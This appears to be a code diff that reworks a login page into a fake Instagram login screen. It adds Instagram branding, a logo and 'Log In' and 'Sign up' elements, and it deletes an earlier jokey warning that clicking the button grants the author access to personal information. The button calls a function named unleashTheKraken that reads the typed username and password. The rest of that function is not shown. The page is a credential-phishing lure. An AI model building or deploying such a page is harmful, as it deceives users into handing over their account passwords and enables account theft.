@@ -1,7 +1,72 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Secure Login Portal</title>
+    <title>Instagram Login</title>
+    <style>
+        body {
+            background-color: #fafafa;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        .login-container {
+            max-width: 350px;
+            margin: 100px auto;
+            padding: 20px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: bold;
+            color: #262626;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 10px;
+            background-color: #3897f0;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .forgot-password,
+        .signup-link {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        .signup-link a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+
+        .warning {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
     <script>
         function unleashTheKraken() {
             var username = document.getElementById("username").value;
@@ -22,14 +87,18 @@
     </script>
 </head>
 <body>
-    <h2>Welcome, oh great client!</h2>
-    <form>
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required><br><br>
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required><br><br>
-        <input type="button" value="Unleash the Kraken" onclick="unleashTheKraken()">
-    </form>
-    <p>Warning: By clicking "Unleash the Kraken," you hereby grant me access to your client's personal info. Mwahaha!</p>
+    <div class="login-container">
+        <img src="instagram_logo.png" alt="Instagram Logo" class="logo">
+        <form>
+            <label for="username">Phone number, username, or email:</label>
+            <input type="text" id="username" name="username" required><br><br>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required><br><br>
+            <input type="button" value="Log In" onclick="unleashTheKraken()" class="login-button">
+        </form>
+        <p class="forgot-password">Forgot password?</p>
+        <p class="signup-link">Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+    
 </body>
 </html>
